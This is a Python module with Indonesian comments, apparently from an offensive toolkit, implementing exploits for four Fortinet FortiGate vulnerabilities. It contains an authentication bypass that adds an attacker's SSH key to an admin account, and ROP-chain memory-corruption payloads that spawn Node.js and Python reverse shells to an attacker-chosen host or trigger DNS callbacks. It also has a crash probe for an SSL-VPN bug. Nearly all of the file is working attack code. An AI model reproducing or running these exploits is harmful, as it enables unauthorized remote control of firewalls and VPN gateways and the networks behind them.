# File: _exploits.py
# -*- coding: utf-8 -*-
"""
Kumpulan modul eksploitasi khusus untuk Fortinet CVEs.
Versi ini berisi perbaikan efisiensi dan akurasi untuk payload CVE-2024-21762.
"""
from time import sleep
from random import randint
import urllib
import base64, gzip, zlib, json, struct, ssl, socket, threading, os, shutil, subprocess
from sys import version_info, exit

# --- FUNGSI HELPER LOKAL (untuk menghilangkan dependensi ke sincan2) ---
def print_and_flush(message, same_line=False):
    end_char = '' if same_line else '\n'
    if version_info[0] >= 3:
        print(message, end=end_char, flush=True)
    else:
        import sys
        sys.stdout.write(message + end_char)
        sys.stdout.flush()

# --- DEPENDENSI BARU ---
try:
    import requests
    from pwn import p64
    from Crypto.Cipher import AES
except ImportError:
    print_and_flush("\n[!] Dependensi penting tidak ditemukan. Harap install dengan 'pip install requests pycryptodome pwntools'\n")
    exit(1)

from io import BytesIO

if version_info[0] >= 3:
    from urllib.parse import quote, urlparse

try:
    from urllib3.exceptions import TimeoutError, NewConnectionError, MaxRetryError
except ImportError:
    print_and_flush("\n[!] Urllib3 tidak ditemukan. Silakan install dengan 'pip install urllib3'\n")
    exit(1)

# Definisi warna
RED = '\x1b[91m'
GREEN = '\033[32m'
BLUE = '\033[94m'
YELLOW = '\033[1;33m'
BOLD = '\033[1m'
ENDC = '\033[0m'

global gl_http_pool

def set_http_pool(pool):
    """Mengonfigurasi http pool."""
    global gl_http_pool
    gl_http_pool = pool

# ========================================================================================
# MODUL EKSPLOITASI FORTINET
# ========================================================================================

def exploit_cve_2022_40684(url, args):
    """
    CVE-2022-40684: FortiGate Authentication Bypass untuk menambahkan kunci SSH.
    """
    print_and_flush(" (CVE-2022-40684)", same_line=True)
    
    try:
        with open(os.path.expanduser(args.forti_ssh_key), 'r') as f:
            ssh_key = f.read().strip()
    except Exception as e:
        return {"status": "error", "details": f"Gagal membaca file SSH key: {e}"}

    parsed_url = urlparse(url)
    target_host = parsed_url.hostname
    target_port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    api_url = f"{parsed_url.scheme}://{target_host}:{target_port}/api/v2/cmdb/system/admin/{args.forti_user}"
    
    headers = {
        'User-Agent': 'Report Runner',
        'Forwarded': 'for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"'
    }
    data = {"ssh-public-key1": f'{ssh_key}'}

    try:
        r = requests.put(api_url, headers=headers, json=data, verify=False, timeout=20)
        if r.status_code == 200 and ('SSH key is good' in r.text or 'success' in r.text):
            return {"status": "vulnerable", "details": f"Kunci SSH berhasil ditambahkan untuk user '{args.forti_user}'. Coba: ssh {args.forti_user}@{target_host}"}
        else:
            return {"status": "ok", "details": f"Gagal menambahkan kunci, status: {r.status_code}, response: {r.text[:100]}"}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def exploit_cve_2024_21762(url, args):
    """
    CVE-2024-21762: FortiGate SSL VPN Out-of-Bounds Write RCE.
    Implementasi baru yang lebih efisien dan fleksibel (DNS Callback / Reverse Shell).
    """
    print_and_flush(" (CVE-2024-21762)", same_line=True)

    parsed_url = urlparse(url)
    target_host = parsed_url.hostname
    target_port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    
    # --- Logika Pemilihan Payload ---
    if args.reverse_host and args.reverse_port:
        print_and_flush("\n    -> Mode: Reverse Shell", same_line=True)
        # Payload Node.js untuk reverse shell
        js_payload = f'(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",["-i"]);var client=new net.Socket();client.connect({args.reverse_port},"{args.reverse_host}",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();%00'.encode()
    elif args.callback_host:
        print_and_flush("\n    -> Mode: DNS Callback", same_line=True)
        # Payload Node.js untuk DNS callback
        js_payload = f'(function(){{var cp=require("child_process");cp.execSync("nslookup {urllib.parse.quote(args.callback_host)}");}})();%00'.encode()
    else:
        return {"status": "error", "details": "Parameter --callback-host atau --reverse-host/port diperlukan."}
    
    # --- Konstruksi Payload dari PoC Akurat ---
    ssl_do_handshake_ptr = b"%60%ce%42%00%00%00%00%00"
    getcwd_ptr = b"%70%62%2c%04%00%00%00%00"
    pivot_1 = b"%52%f7%fd%00%00%00%00%00"
    pivot_2 = b"%ac%c9%ab%02%00%00%00%00"
    rop  = b""
    rop += b"%c6%e2%46%00%00%00%00%00" # push rdi; pop rax; ret;
    rop += b"%19%6f%4d%01%00%00%00%00" # sub rax, 0x2c8; ret;
    rop += b"%8e%b2%fe%01%00%00%00%00" # add rax, 0x10; ret;
    rop += b"%63%db%ae%02%00%00%00%00" # pop rcx; ret;
    rop += b"%00%00%00%00%00%00%00%00" # zero rcx
    rop += b"%38%ad%98%02%00%00%00%00" # or rcx, rax; setne al; movzx eax, al; ret;
    rop += b"%c6%52%86%02%00%00%00%00" # shl rax, 4; add rax, rdx; ret;
    rop += b"%6e%d0%3f%01%00%00%00%00" # or rdx, rcx; ret;
    rop += b"%a4%df%98%02%00%00%00%00" # sub rdx, rax; mov rax, rdx; ret;
    rop += b"%f5%2c%e6%00%00%00%00%00" # sub rax, 0x10; ret;
    rop += b"%e4%e6%d7%01%00%00%00%00" # add rsi, rax; mov [rdi+8], rsi; ret;
    rop += b"%10%1b%0a%01%00%00%00%00" # push rax; pop rdi; add eax, 0x5d5c415b; ret;
    rop += b"%25%0f%8d%02%00%00%00%00" # pop r8; ret; 0x028d0f25
    rop += b"%00%00%00%00%00%00%00%00" # r8
    pivot_3 = b"%e0%3f%4d%02%00%00%00%00"
    call_execl = b"%80%c1%43%00%00%00%00%00"
    bin_node = b"/bin/node%00"
    e_flag = b"-e%00"

    form_value  = b""
    form_value += b"B"*11 + bin_node + b"B"*6 + e_flag + b"B"*14 + js_payload
    form_value += b"B"*438 + pivot_2 + getcwd_ptr
    form_value += b"B"*32 + pivot_1
    form_value += b"B"*168 + call_execl
    form_value += b"B"*432 + ssl_do_handshake_ptr
    form_value += b"B"*32 + rop + pivot_3
    body = (b"B"*1808 + b"=" + form_value + b"&")*20

    data1  = b"POST /remote/hostcheck_validate HTTP/1.1\r\n"
    data1 += b"Host: " + target_host.encode() + b"\r\n"
    data1 += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    data1 += b"\r\n"
    data1 += body

    data2  = b"POST / HTTP/1.1\r\n"
    data2 += b"Host: " + target_host.encode() + b"\r\n"
    data2 += b"Transfer-Encoding: chunked\r\n"
    data2 += b"\r\n"
    data2 += b"0"*4137 + b"\0"
    data2 += b"A"*1 + b"\r\n\r\n"

    try:
        def send_payload(payload, host, port):
            # Menggunakan soket mentah karena lebih andal untuk PoC ini
            with socket.create_connection((host, port), timeout=10) as s:
                s.sendall(payload)
        
        # Tahap 1
        send_payload(data1, target_host, target_port)
        sleep(2)
        # Tahap 2
        send_payload(data2, target_host, target_port)
        
        return {"status": "vulnerable", "details": f"Payload 2 tahap terkirim. Periksa callback/listener Anda."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

def exploit_cve_2023_27997(url, args):
    """
    CVE-2023-27997: FortiGate SSL VPN Heap Overflow RCE for reverse shell.
    Implementasi ini menggunakan PoC yang lebih akurat dengan timeout yang benar.
    """
    print_and_flush(" (CVE-2023-27997)", same_line=True)
    
    parsed_url = urlparse(url)
    target_host = parsed_url.hostname
    target_port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    
    # Binary functions & gadgets
    execve = p64(0x0042e050)
    poprsi = p64(0x000000000042f0f8)
    poprdx = p64(0x000000000042f4a5)
    jmprax = p64(0x0000000000433181)
    pops = p64(0x000000000165cfd7)
    poprax = p64(0x00000000004359af)
    gadget1 = p64(0x0000000001697e0d)
    poprdi = p64(0x000000000042ed7e)
    rax3 = gadget1

    # Hardcoded value
    hardcoded = 0x00007fc5f128e000
    rdi = p64(hardcoded + 0xc48)
    cmd = p64(hardcoded + 0xd38)
    asdf = hardcoded + 0xd38
    cmd1 = p64(asdf)
    cmd2 = p64(asdf + 16)
    arg1 = p64(asdf + 48)
    arg2 = p64(asdf + 56)
    arg3 = p64(asdf + 64)

    # ROP chain dengan shellcode yang lebih andal
    strparams = "['sh']"
    reverse_shell_cmd = f"import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{args.reverse_host}',{args.reverse_port}));[os.dup2(s.fileno(),x) for x in range(3)];i=os.fork();os.execve('/bin/sh', {strparams},{{}}) if i==0 else None".encode()
    
    ropchain = poprax
    ropchain += execve
    ropchain += poprdi
    ropchain += cmd1
    ropchain += poprsi
    ropchain += cmd2
    ropchain += poprdx
    ropchain += p64(0)
    ropchain += jmprax
    ropchain += b"/bin/python\x00\x00\x00\x00\x00"
    ropchain += arg1
    ropchain += arg2
    ropchain += arg3
    ropchain += p64(0)
    ropchain += b"python\x00\x00"
    ropchain += b"-c\x00\x00\x00\x00\x00\x00"
    ropchain += reverse_shell_cmd + b"\x00\x00"

    payload = b"A"*173096+rdi+poprdi+cmd+pops+b"A"*40+pops+rax3+b"C"*32+ropchain
    request = (f"POST /remote/error HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: 115964117980\r\n\r\n").encode() + payload
    
    try:
        print_and_flush("\n    -> Mengirim payload...", same_line=True)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((target_host, target_port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                ssock.settimeout(5)
                ssock.sendall(request)
                ssock.recv(1024) 
                
    except socket.timeout:
        return {"status": "vulnerable", "details": "Payload terkirim (target tidak merespons, ini diharapkan). Periksa listener Anda."}
    except (ConnectionResetError, BrokenPipeError):
        return {"status": "vulnerable", "details": "Payload terkirim (koneksi direset oleh target, ini diharapkan). Periksa listener Anda."}
    except Exception as e:
        return {"status": "error", "details": str(e)}

    return {"status": "ok", "details": "Target merespons setelah payload dikirim, kemungkinan tidak rentan."}


def exploit_cve_2022_42475(url, args):
    """
    CVE-2022-42475: FortiGate SSL-VPN Pre-Auth RCE. Implementasi crash test sederhana.
    """
    print_and_flush(" (CVE-2022-42475)", same_line=True)
    
    parsed_url = urlparse(url)
    target_host = parsed_url.hostname
    target_port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    
    req = b"POST /remote/logincheck HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\nContent-Length: 4294967297\r\n\r\n" + b"A" * 30000
    
    try:
        context = ssl.create_default_context(); context.check_hostname = False; context.verify_mode = ssl.CERT_NONE
        with socket.create_connection((target_host, target_port), timeout=10) as sock:
             with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                ssock.sendall(req)
                data = ssock.recv(1024)
                if not data:
                    return {"status": "vulnerable", "details": "Koneksi ditutup setelah mengirim payload besar. Indikasi kuat kerentanan."}
                return {"status": "ok", "details": "Target tidak crash, kemungkinan tidak rentan."}
    except socket.timeout:
        return {"status": "ok", "details": "Request timeout, kemungkinan tidak rentan."}
    except Exception:
        return {"status": "vulnerable", "details": "Koneksi error/reset, indikasi kuat kerentanan."}
